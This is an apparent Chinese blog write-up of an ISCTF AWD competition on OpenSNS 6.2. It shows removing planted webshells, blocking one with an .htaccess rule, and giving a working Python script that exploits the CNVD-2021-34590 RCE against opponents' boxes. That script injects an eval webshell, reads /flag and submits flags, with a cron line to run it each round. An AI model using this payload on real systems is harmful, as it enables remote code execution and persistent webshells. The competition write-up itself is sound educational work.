@@ -1,0 +1,325 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>记一次ISCTF新生赛的AWD | q1jun's Blog</title><meta name="keywords" content="网络安全,AWD"><meta name="author" content="q1jun"><meta name="copyright" content="q1jun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最终得分111913，因为不太会pwn，所以只能靠web得分了呜呜 0x01 拿到自己的Box拿到自己的box之后，第一时间把源码下载下来：  站点为：OPENSNS V6.2 审计一下代码   因为出门只有mac没有win不能直接用D盾扫，只好手动审计一下了  在**.config.php**上发现了一个不死马，最后知道这是三哈传的  还有一个一句话木马：  这个一句话木马直接删除就好。 不死">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次ISCTF新生赛的AWD">
+<meta property="og:url" content="http://q1jun.cn/2022/11/04/1fc5167b9242-q1jun/index.html">
+<meta property="og:site_name" content="q1jun&#39;s Blog">
+<meta property="og:description" content="最终得分111913，因为不太会pwn，所以只能靠web得分了呜呜 0x01 拿到自己的Box拿到自己的box之后，第一时间把源码下载下来：  站点为：OPENSNS V6.2 审计一下代码   因为出门只有mac没有win不能直接用D盾扫，只好手动审计一下了  在**.config.php**上发现了一个不死马，最后知道这是三哈传的  还有一个一句话木马：  这个一句话木马直接删除就好。 不死">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2022ISCTF.jpg">
+<meta property="article:published_time" content="2022-11-04T00:23:31.000Z">
+<meta property="article:modified_time" content="2022-11-04T00:23:31.000Z">
+<meta property="article:author" content="q1jun">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="AWD">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2022ISCTF.jpg"><link rel="shortcut icon" href="/img/wallpaper3.jpg"><link rel="canonical" href="http://q1jun.cn/2022/11/04/1fc5167b9242-q1jun/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="manifest" href="/pwa/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/pwa/apple-touch-icon.png"/><link rel="mask-icon" href="/pwa/safari-pinned-tab.svg" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/pluginsSrc/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/pluginsSrc/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":400,"languages":{"author":"作者: q1jun","link":"链接: ","source":"来源: q1jun's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '记一次ISCTF新生赛的AWD',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-04 08:23:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/css/main.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">65</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-book"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2022ISCTF.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">q1jun's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-book"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">记一次ISCTF新生赛的AWD</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-04T00:23:31.000Z" title="发表于 2022-11-04 08:23:31">2022-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-04T00:23:31.000Z" title="更新于 2022-11-04 08:23:31">2022-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/AWD/">AWD</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">755</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104084714225.png" alt="image-20221104084714225"></p>
+<p>最终得分111913，因为不太会pwn，所以只能靠web得分了呜呜</p>
+<h2 id="0x01-拿到自己的Box"><a href="#0x01-拿到自己的Box" class="headerlink" title="0x01 拿到自己的Box"></a>0x01 拿到自己的Box</h2><p>拿到自己的box之后，第一时间把源码下载下来：</p>
+<p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104085116310.png" alt="image-20221104085116310"></p>
+<p>站点为：<strong>OPENSNS V6.2</strong></p>
+<p>审计一下代码</p>
+<blockquote>
+<p> 因为出门只有mac没有win不能直接用D盾扫，只好手动审计一下了</p>
+</blockquote>
+<p>在**.config.php**上发现了一个不死马，<del>最后知道这是三哈传的</del></p>
+<p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104085356624.png" alt="image-20221104085356624"></p>
+<p>还有一个一句话木马：</p>
+<p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104085441370.png" alt="image-20221104085441370"></p>
+<p>这个一句话木马直接删除就好。</p>
+<p>不死马的话直接修改<code>.htaccess</code>文件，添加一行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">    ······</span><br><span class="line">    #修复不死马</span><br><span class="line">    RewriteRule (.*).config.php$                     - [F]</span><br><span class="line">    ······</span><br></pre></td></tr></table></figure>
+
+<p>再次访问，就可以看到 这个不死马已经是403了。</p>
+<h2 id="0x02-RCE修复"><a href="#0x02-RCE修复" class="headerlink" title="0x02 RCE修复"></a>0x02 RCE修复</h2><p><strong>CNVD-2021-34590</strong>，参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/122215945">Opensns 命令执行漏洞（CNVD-2021-34590)</a></p>
+<p>漏洞代码位于**&#x2F;app&#x2F;Application&#x2F;Weibo&#x2F;Model&#x2F;ShareModel.class.php**</p>
+<p>（比赛懒得修，直接修改文件后缀就好了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /app/Application/Weibo/Model/ShareModel.class.php /app/Application/Weibo/Model/ShareModel.class.php.bak</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-攻击其他靶机"><a href="#0x03-攻击其他靶机" class="headerlink" title="0x03 攻击其他靶机"></a>0x03 攻击其他靶机</h2><p>知道了<strong>CNVD-2021-34590</strong>的利用方式，通过该<code>rce</code>可以编辑一个脚本进行自动获得flag，并提交：</p>
+<blockquote>
+<p>因为打比赛的时间都在上课，所以脚本也是仓促写的，能用就行（看不懂别骂我</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">9</span>: <span class="comment">#38009被ban，跳过</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    url1 = <span class="string">&quot;http://120.79.18.34:380&quot;</span>+<span class="string">&quot;%02d&quot;</span>%i+<span class="string">&quot;/http://106.54.23.125/index.php?s=weibo/share/shareBox&amp;query=app=Common%26model=Schedule%26method=runSchedule%26id[method]=-%3E_validationFieldItem%26id[status]=1%26id[4]=function%26id[1]=assert%26id[args]=jiang=@eval($_POST[cmd])%26id[0]=jiang&quot;</span></span><br><span class="line">    passwd=<span class="string">&quot;cmd&quot;</span></span><br><span class="line">    payload=&#123;</span><br><span class="line">        passwd:<span class="string">&#x27;system(\&#x27;cat /flag\&#x27;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.post(url1,payload,timeout=<span class="number">1</span>).text</span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;ISCTF.+\&#125;&#x27;</span>)</span><br><span class="line">    result=pattern.findall(response)</span><br><span class="line">    <span class="comment"># upurl = &quot;http://120.79.18.34:19999/api/flag&quot;</span></span><br><span class="line">    <span class="comment"># header = &#123;</span></span><br><span class="line">    <span class="comment">#     &#x27;Authorization&#x27;: &#x27;换成你的&#x27;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    flag = <span class="built_in">str</span>(result).replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    a=os.system(<span class="string">&quot;curl -X POST http://120.79.18.34:19999/api/flag -H &#x27;Authorization: 换成你的&#x27; -d &#x27;&#123; \&quot;flag\&quot;: \&quot;&quot;</span>+flag+<span class="string">&quot;\&quot; &#125;&#x27;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;http://120.79.18.34:380&quot;</span>+<span class="string">&quot;%02d&quot;</span>%i+<span class="string">f&quot;flag提交成功，返回数据：\n<span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>前期由于大部分选手都没有修复这个漏洞，所以基本上是可以AK所有Web站点，得分也比较高。</p>
+<p>也可以通过这个漏洞上传自己的小马，进行批量得分，通过上方的脚本修改一下就可以。</p>
+<p>由于比赛是10分钟一轮，可以通过在Linux设置定时执行脚本来自动得分：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e #打开cron设置</span><br></pre></td></tr></table></figure>
+
+<p>输入下面定时设置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,11,21,31,41,51 * * * * python3 ~/script.py &gt;&gt; ~/log.log</span><br></pre></td></tr></table></figure>
+
+<p>表示每小时的1,11,21,31,41,51分钟执行一次该脚本</p>
+<blockquote>
+<p>后面有个老哥在每轮开始就删站，不让其他人得分，导致其他人没有体验。</p>
+<p>我只能通过先前埋的小马拿保底分…</p>
+<p>最后主办方提前结束了比赛，挺没意思的</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://q1jun.cn">q1jun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://q1jun.cn/2022/11/04/1fc5167b9242-q1jun/">http://q1jun.cn/2022/11/04/1fc5167b9242-q1jun/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://q1jun.cn" target="_blank">q1jun's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/AWD/">AWD</a></div><div class="post_share"><div class="social-share" data-image="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2022ISCTF.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="/pluginsSrc/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/02/ca47008dac60-q1jun/"><img class="next-cover" src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221102230743082.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[UUCTF 2022]ez_user</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/07/06/d7843130fc49-q1jun/" title="OWASP Top10 及常见预防方法"><img class="cover" src="/img/wallpaper.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-06</div><div class="title">OWASP Top10 及常见预防方法</div></div></a></div><div><a href="/2021/12/08/89d9a84fca63-q1jun/" title="WebGoat 网安攻击模拟训练笔记"><img class="cover" src="/img/wallpaper.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">WebGoat 网安攻击模拟训练笔记</div></div></a></div><div><a href="/2021/04/12/710b737857f5-q1jun/" title="BUUoj 之 RSA"><img class="cover" src="/img/wallpaper2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-12</div><div class="title">BUUoj 之 RSA</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Giscus</span><span class="switch-btn"></span><span class="second-comment">Livere</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div><div><div id="lv-container" data-id="city" data-uid="MTAyMC81NTkwMi8zMjM2Ng=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%8B%BF%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84Box"><span class="toc-text">0x01 拿到自己的Box</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-RCE%E4%BF%AE%E5%A4%8D"><span class="toc-text">0x02 RCE修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%94%BB%E5%87%BB%E5%85%B6%E4%BB%96%E9%9D%B6%E6%9C%BA"><span class="toc-text">0x03 攻击其他靶机</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By q1jun</div><div class="footer_custom_text"><span>备案号：<a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021005418号-2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/pluginsSrc/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/pluginsSrc/instant.page/instantpage.js" type="module"></script><script src="/pluginsSrc/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('/pluginsSrc/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>function loadGiscus () {
+  let nowTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light'
+
+  const config = Object.assign({
+    src: 'https://giscus.app/client.js',
+    'data-repo': 'q1jun/discussionRepo',
+    'data-repo-id': 'R_kgDOHF7Pfg',
+    'data-category-id': 'DIC_kwDOHF7Pfs4COV0X',
+    'data-mapping': 'pathname',
+    'data-theme': nowTheme,
+    'data-reactions-enabled': '1',
+    crossorigin: 'anonymous',
+    async: true
+  },null)
+
+  let ele = document.createElement('script')
+  for (let key in config) {
+    ele.setAttribute(key, config[key])
+  }
+  document.getElementById('giscus-wrap').insertAdjacentElement('afterbegin',ele)
+}
+
+function changeGiscusTheme () {
+  const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light'
+
+  function sendMessage(message) {
+    const iframe = document.querySelector('iframe.giscus-frame');
+    if (!iframe) return;
+    iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+  }
+
+  sendMessage({
+    setConfig: {
+      theme: theme
+    }
+  });
+}
+
+if ('Giscus' === 'Giscus' || !false) {
+  if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+  else loadGiscus()
+} else {
+  function loadOtherComment () {
+    loadGiscus()
+  }
+}</script><script>function loadLivere () {
+  if (typeof LivereTower === 'object') {
+    window.LivereTower.init()
+  }
+  else {
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+  }
+}
+
+if ('Giscus' === 'Livere' || !false) {
+  if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+  else loadLivere()
+}
+else {
+  function loadOtherComment () {
+    loadLivere()
+  }
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="/pluginsSrc/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="/pluginsSrc/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="/pluginsSrc/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="/pluginsSrc/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script></div><!-- hexo injector body_end start --><script data-pjax>function history_calendar_injector_config(){
+                var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+                var item_html = '<div class="card-widget card-history"><div class="card-content"><div class="item-headline"><i class="fas fa-clock fa-spin"></i><span>那年今日</span></div><div id="history-baidu" style="height: 100px;overflow: hidden"><div class="history_swiper-container" id="history-container" style="width: 100%;height: 100%"><div class="swiper-wrapper" id="history_container_wrapper" style="height:20px"></div></div></div></div>';
+                console.log('已挂载history_calendar')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('sticky_layout')[0] && (location.pathname ==='/'|| '/' ==='all')){
+
+            history_calendar_injector_config()
+        } </script><script data-pjax  src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script><script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/js/main.js"></script><!-- hexo injector body_end end --></body></html>
